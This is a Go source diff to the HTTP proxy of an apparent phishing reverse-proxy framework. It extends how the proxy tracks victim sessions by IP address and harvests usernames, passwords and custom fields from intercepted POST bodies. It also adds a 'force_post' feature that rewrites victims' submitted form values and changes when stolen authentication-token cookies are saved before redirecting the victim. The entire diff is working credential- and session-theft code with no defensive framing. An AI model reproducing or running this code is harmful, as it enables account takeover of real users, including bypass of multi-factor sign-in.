@@ -36,18 +36,20 @@ const (
 )
 
 type HttpProxy struct {
-	Server      *http.Server
-	Proxy       *goproxy.ProxyHttpServer
-	crt_db      *CertDb
-	cfg         *Config
-	db          *database.Database
-	sniListener net.Listener
-	isRunning   bool
-	sessions    map[string]*Session
-	sids        map[string]int
-	cookieName  string
-	last_sid    int
-	developer   bool
+	Server       *http.Server
+	Proxy        *goproxy.ProxyHttpServer
+	crt_db       *CertDb
+	cfg          *Config
+	db           *database.Database
+	sniListener  net.Listener
+	isRunning    bool
+	sessions     map[string]*Session
+	sids         map[string]int
+	cookieName   string
+	last_sid     int
+	developer    bool
+	ip_whitelist map[string]int64
+	ip_sids      map[string]string
 }
 
 type ProxySession struct {
@@ -59,14 +61,16 @@ type ProxySession struct {
 
 func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, developer bool) (*HttpProxy, error) {
 	p := &HttpProxy{
-		Proxy:     goproxy.NewProxyHttpServer(),
-		Server:    nil,
-		crt_db:    crt_db,
-		cfg:       cfg,
-		db:        db,
-		isRunning: false,
-		last_sid:  0,
-		developer: developer,
+		Proxy:        goproxy.NewProxyHttpServer(),
+		Server:       nil,
+		crt_db:       crt_db,
+		cfg:          cfg,
+		db:           db,
+		isRunning:    false,
+		last_sid:     0,
+		developer:    developer,
+		ip_whitelist: make(map[string]int64),
+		ip_sids:      make(map[string]string),
 	}
 
 	p.Server = &http.Server{
@@ -124,7 +128,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				// handle session
 				if p.handleSession(req.Host) && pl != nil {
 					sc, err := req.Cookie(p.cookieName)
-					if err != nil {
+					if err != nil && !p.isWhitelistedIP(remote_addr) {
 						if !p.cfg.IsSiteHidden(pl_name) {
 							uv := req.URL.Query()
 							vv := uv.Get(p.cfg.verificationParam)
@@ -155,6 +159,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									ps.SessionId = session.Id
 									ps.Created = true
 									ps.Index = sid
+									p.whitelistIP(remote_addr, ps.SessionId)
 									req_ok = true
 								}
 							} else {
@@ -164,10 +169,20 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							log.Warning("[%s] request to hidden phishlet: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
 						}
 					} else {
-						var ok bool
-						ps.Index, ok = p.sids[sc.Value]
+						var ok bool = false
+						if err == nil {
+							ps.Index, ok = p.sids[sc.Value]
+							if ok {
+								ps.SessionId = sc.Value
+							}
+						} else {
+							ps.SessionId, ok = p.getSessionIdByIP(remote_addr)
+							if ok {
+								ps.Index, ok = p.sids[ps.SessionId]
+							}
+						}
 						if ok {
-							ps.SessionId = sc.Value
+							p.whitelistIP(remote_addr, ps.SessionId)
 							req_ok = true
 						} else {
 							log.Warning("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
@@ -227,28 +242,38 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						if contentType == "application/json" {
 
 							json, _ := ioutil.ReadAll(req.Body)
-							log.Debug("POST %s", json)
+							log.Debug("POST: %s", req.URL.Path)
+							log.Debug("POST body = %s", json)
 
-							if pl.k_username == "json" {
-								if re, err := regexp.Compile(pl.re_username); err == nil {
-									um := re.FindStringSubmatch(string(json))
-									if um != nil && len(um) > 1 {
-										p.setSessionUsername(ps.SessionId, um[1])
-										log.Success("[%d] Username: [%s]", ps.Index, um[1])
-										if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
-											log.Error("database: %v", err)
-										}
+							if pl.username.tp == "json" {
+								um := pl.username.search.FindStringSubmatch(string(json))
+								if um != nil && len(um) > 1 {
+									p.setSessionUsername(ps.SessionId, um[1])
+									log.Success("[%d] Username: [%s]", ps.Index, um[1])
+									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
+										log.Error("database: %v", err)
 									}
 								}
 							}
 
-							if pl.k_password == "json" {
-								if re, err := regexp.Compile(pl.re_password); err == nil {
-									pm := re.FindStringSubmatch(string(json))
-									if pm != nil && len(pm) > 1 {
-										p.setSessionPassword(ps.SessionId, pm[1])
-										log.Success("[%d] Password: [%s]", ps.Index, pm[1])
-										if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
+							if pl.password.tp == "json" {
+								pm := pl.password.search.FindStringSubmatch(string(json))
+								if pm != nil && len(pm) > 1 {
+									p.setSessionPassword(ps.SessionId, pm[1])
+									log.Success("[%d] Password: [%s]", ps.Index, pm[1])
+									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
+										log.Error("database: %v", err)
+									}
+								}
+							}
+
+							for _, cp := range pl.custom {
+								if cp.tp == "json" {
+									cm := cp.search.FindStringSubmatch(string(json))
+									if cm != nil && len(cm) > 1 {
+										p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
+										log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
+										if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
 											log.Error("database: %v", err)
 										}
 									}
@@ -258,33 +283,79 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						} else {
 
 							if req.ParseForm() == nil {
-								for k, v := range req.Form {
+								log.Debug("POST: %s", req.URL.Path)
+								for k, v := range req.PostForm {
 									log.Debug("POST %s = %s", k, v[0])
-									if (pl.k_re_username != nil && pl.k_re_username.MatchString(k)) || (pl.k_re_username == nil && k == pl.k_username) {
-										if re, err := regexp.Compile(pl.re_username); err == nil {
-											um := re.FindStringSubmatch(v[0])
-											if um != nil && len(um) > 1 {
-												p.setSessionUsername(ps.SessionId, um[1])
-												log.Success("[%d] Username: [%s]", ps.Index, um[1])
-												if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
-													log.Error("database: %v", err)
-												}
+									if pl.username.key != nil && pl.username.search != nil && pl.username.key.MatchString(k) {
+										um := pl.username.search.FindStringSubmatch(v[0])
+										if um != nil && len(um) > 1 {
+											p.setSessionUsername(ps.SessionId, um[1])
+											log.Success("[%d] Username: [%s]", ps.Index, um[1])
+											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
+												log.Error("database: %v", err)
 											}
 										}
 									}
-									if (pl.k_re_password != nil && pl.k_re_password.MatchString(k)) || (pl.k_re_password == nil && k == pl.k_password) {
-										if re, err := regexp.Compile(pl.re_password); err == nil {
-											pm := re.FindStringSubmatch(v[0])
-											if pm != nil && len(pm) > 1 {
-												p.setSessionPassword(ps.SessionId, pm[1])
-												log.Success("[%d] Password: [%s]", ps.Index, pm[1])
-												if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
+									if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
+										pm := pl.password.search.FindStringSubmatch(v[0])
+										if pm != nil && len(pm) > 1 {
+											p.setSessionPassword(ps.SessionId, pm[1])
+											log.Success("[%d] Password: [%s]", ps.Index, pm[1])
+											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
+												log.Error("database: %v", err)
+											}
+										}
+									}
+									for _, cp := range pl.custom {
+										if cp.key != nil && cp.search != nil && cp.key.MatchString(k) {
+											cm := cp.search.FindStringSubmatch(v[0])
+											if cm != nil && len(cm) > 1 {
+												p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
+												log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
+												if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
 													log.Error("database: %v", err)
 												}
 											}
 										}
 									}
 								}
+
+								// force posts
+								for _, fp := range pl.forcePost {
+									if fp.path.MatchString(req.URL.Path) {
+										log.Debug("force_post: url matched: %s", req.URL.Path)
+										ok_search := false
+										if len(fp.search) > 0 {
+											k_matched := len(fp.search)
+											for _, fp_s := range fp.search {
+												for k, v := range req.PostForm {
+													if fp_s.key.MatchString(k) && fp_s.search.MatchString(v[0]) {
+														if k_matched > 0 {
+															k_matched -= 1
+														}
+														log.Debug("force_post: [%d] matched - %s = %s", k_matched, k, v[0])
+														break
+													}
+												}
+											}
+											if k_matched == 0 {
+												ok_search = true
+											}
+										} else {
+											ok_search = true
+										}
+
+										if ok_search {
+											for _, fp_f := range fp.force {
+												req.PostForm.Set(fp_f.key, fp_f.value)
+											}
+											body = []byte(req.PostForm.Encode())
+											req.ContentLength = int64(len(body))
+											log.Debug("force_post: body: %s len:%d", body, len(body))
+										}
+									}
+								}
+
 							}
 
 						}
@@ -297,25 +368,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 				req.Header.Set(string(e), e_host)
 
-				if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
-					s, ok := p.sessions[ps.SessionId]
-					if ok && !s.IsDone {
-						for _, au := range pl.authUrls {
-							if au.MatchString(req.URL.Path) {
-								err := p.db.SetSessionTokens(ps.SessionId, s.Tokens)
-								if err != nil {
-									log.Error("database: %v", err)
-								}
-								s.IsDone = true
-								if err == nil {
-									log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, req.URL.Path)
-								}
-								break
-							}
-						}
-					}
-				}
-
 				if ps.SessionId != "" && origin == "" {
 					s, ok := p.sessions[ps.SessionId]
 					if ok {
@@ -325,6 +377,19 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							if resp != nil {
 								resp.Header.Add("Location", s.RedirectURL)
 								return req, resp
+							}
+						}
+					}
+				}
+
+				if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
+					s, ok := p.sessions[ps.SessionId]
+					if ok && !s.IsDone {
+						for _, au := range pl.authUrls {
+							if au.MatchString(req.URL.Path) {
+								s.IsDone = true
+								s.IsAuthUrl = true
+								break
 							}
 						}
 					}
@@ -350,8 +415,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						Value:   ps.SessionId,
 						Path:    "/",
 						Domain:  ps.PhishDomain,
-						Expires: time.Now().UTC().Add(15 * time.Minute),
-						MaxAge:  15 * 60,
+						Expires: time.Now().UTC().Add(60 * time.Minute),
+						MaxAge:  60 * 60,
 					}
 				}
 			}
@@ -397,7 +462,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					log.Debug("%s: %s = %s", c_domain, ck.Name, ck.Value)
 					if pl.isAuthToken(c_domain, ck.Name) {
 						s, ok := p.sessions[ps.SessionId]
-						if ok && !s.IsDone {
+						if ok && (s.IsAuthUrl || !s.IsDone) {
 							if ck.Value != "" { // cookies with empty values are of no interest to us
 								is_auth = s.AddAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, auth_tokens)
 								if len(pl.authUrls) > 0 {
@@ -447,6 +512,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								re_s = strings.Replace(re_s, "{hostname}", regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain)), -1)
 								re_s = strings.Replace(re_s, "{subdomain}", regexp.QuoteMeta(sf.subdomain), -1)
 								re_s = strings.Replace(re_s, "{domain}", regexp.QuoteMeta(sf.domain), -1)
+								re_s = strings.Replace(re_s, "{hostname_regexp}", regexp.QuoteMeta(regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain))), -1)
+								re_s = strings.Replace(re_s, "{subdomain_regexp}", regexp.QuoteMeta(sf.subdomain), -1)
+								re_s = strings.Replace(re_s, "{domain_regexp}", regexp.QuoteMeta(sf.domain), -1)
 								replace_s = strings.Replace(replace_s, "{hostname}", phish_hostname, -1)
 								replace_s = strings.Replace(replace_s, "{subdomain}", phish_sub, -1)
 								replace_s = strings.Replace(replace_s, "{hostname_regexp}", regexp.QuoteMeta(phish_hostname), -1)
@@ -467,6 +535,32 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 								}
 							}
+						}
+					}
+				}
+			}
+
+			if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
+				s, ok := p.sessions[ps.SessionId]
+				if ok && s.IsDone {
+					for _, au := range pl.authUrls {
+						if au.MatchString(resp.Request.URL.Path) {
+							err := p.db.SetSessionTokens(ps.SessionId, s.Tokens)
+							if err != nil {
+								log.Error("database: %v", err)
+							}
+							if err == nil {
+								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
+							}
+							if s.IsDone && s.RedirectURL != "" {
+								log.Important("[%d] redirecting to URL: %s", ps.Index, s.RedirectURL)
+								resp := goproxy.NewResponse(resp.Request, "text/html", http.StatusFound, "")
+								if resp != nil {
+									resp.Header.Add("Location", s.RedirectURL)
+									return resp
+								}
+							}
+							break
 						}
 					}
 				}
@@ -542,6 +636,16 @@ func (p *HttpProxy) setSessionPassword(sid string, password string) {
 	s, ok := p.sessions[sid]
 	if ok {
 		s.SetPassword(password)
+	}
+}
+
+func (p *HttpProxy) setSessionCustom(sid string, name string, value string) {
+	if sid == "" {
+		return
+	}
+	s, ok := p.sessions[sid]
+	if ok {
+		s.SetCustom(name, value)
 	}
 }
 
@@ -748,6 +852,27 @@ func (p *HttpProxy) deleteRequestCookie(name string, req *http.Request) {
 		new_cookie := re.ReplaceAllString(cookie, "")
 		req.Header.Set("Cookie", new_cookie)
 	}
+}
+
+func (p *HttpProxy) whitelistIP(ip_addr string, sid string) {
+	log.Debug("whitelistIP: %s %s", ip_addr, sid)
+	p.ip_whitelist[ip_addr] = time.Now().Add(5 * time.Second).Unix()
+	p.ip_sids[ip_addr] = sid
+}
+
+func (p *HttpProxy) isWhitelistedIP(ip_addr string) bool {
+	log.Debug("isWhitelistIP: %s", ip_addr)
+	ct := time.Now()
+	if ip_t, ok := p.ip_whitelist[ip_addr]; ok {
+		et := time.Unix(ip_t, 0)
+		return ct.Before(et)
+	}
+	return false
+}
+
+func (p *HttpProxy) getSessionIdByIP(ip_addr string) (string, bool) {
+	sid, ok := p.ip_sids[ip_addr]
+	return sid, ok
 }
 
 type dumbResponseWriter struct {
